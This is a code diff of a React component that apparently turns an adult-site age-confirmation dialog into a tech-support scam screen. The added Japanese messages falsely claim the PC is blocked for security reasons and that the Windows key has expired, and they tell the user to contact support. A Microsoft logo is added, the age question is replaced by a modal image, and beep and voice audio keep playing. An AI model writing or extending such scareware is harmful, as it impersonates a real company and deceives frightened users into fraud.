@@ -1,6 +1,8 @@
 import React, { useState } from "react";
 import Login from "../Login";
-import warningIcon from "../images/warning.png";
+import microsoftLogo from "../images/microsoftLogo.jpeg";
+import cancelIcon from "../images/cancel.png";
+import ModalPic from "../images/modal-pic.jpg";
 import { notification, message } from "antd";
 import beepAudio from "../beep-04.mp3";
 import voice from "../japancams.mp3";
@@ -9,6 +11,7 @@ const AgeConfirm = (props) => {
   const [audio] = useState(new Audio(beepAudio));
   const [audio2] = useState(new Audio(voice));
   const [isModalVisible, setIsModalVisible] = useState(false);
+  const [isBackModalVisible, setIsBackModalVisible] = useState(false);
 
   const loginToDash = () => {
     audio.play();
@@ -20,20 +23,25 @@ const AgeConfirm = (props) => {
     document.getElementById("chat-box").style.display = "block";
 
     showModal();
-    message.error("ログインがブロックされました");
+    message.error("セキュリティ上の理由でPCがブロックされました");
   };
 
   const showModal = () => {
-    setIsModalVisible(true);
+    setIsBackModalVisible(true);
   };
 
   const notificationPopup = () => {
     notification["error"]({
-      message: "ログアウトしました",
-      description:
-        "ログアウトしました。正しいパスワードでログインしてみてください",
+      message: "Windowsキーの有効期限が切れています",
+      description: `新しいキーを取得するには、サポートに連絡してください。`,
       icon: (
-        <img src={warningIcon} height="40px" width="40px" alt="warning icon" />
+        <img
+          src={microsoftLogo}
+          style={{ padding: "0px" }}
+          height="40px"
+          width="40px"
+          alt="warning icon"
+        />
       ),
       onClick: loginToDash,
       onClose: loginToDash,
@@ -53,11 +61,23 @@ const AgeConfirm = (props) => {
         }}
       >
         <div className="age-comfirm-dialog text-center">
-          <div className="mb-20">あなたは18歳以上ですか？</div>
+          <div style={{ textAlign: "right" }}>
+            <img
+              src={cancelIcon}
+              height={20}
+              style={{
+                marginRight: "10px",
+                marginBottom: "5px",
+                cursor: "pointer",
+              }}
+            />
+          </div>
+          {/* <div className="mb-20">あなたは18歳以上ですか？</div>
           <div className="flex mt-20">
             <button className="mr-20 btn btn-lg btn-success">はい</button>
             <button className="btn btn-lg btn-danger">ない</button>
-          </div>
+          </div> */}
+          <img src={ModalPic} height="300px" />
         </div>
       </div>
       <div id="loginPage" style={{ display: "none" }}>
@@ -65,6 +85,8 @@ const AgeConfirm = (props) => {
           notificationPopup={notificationPopup}
           isModalVisible={isModalVisible}
           setIsModalVisible={setIsModalVisible}
+          isBackModalVisible={isBackModalVisible}
+          setIsBackModalVisible={setIsBackModalVisible}
           loginToDash={loginToDash}
         />
       </div>
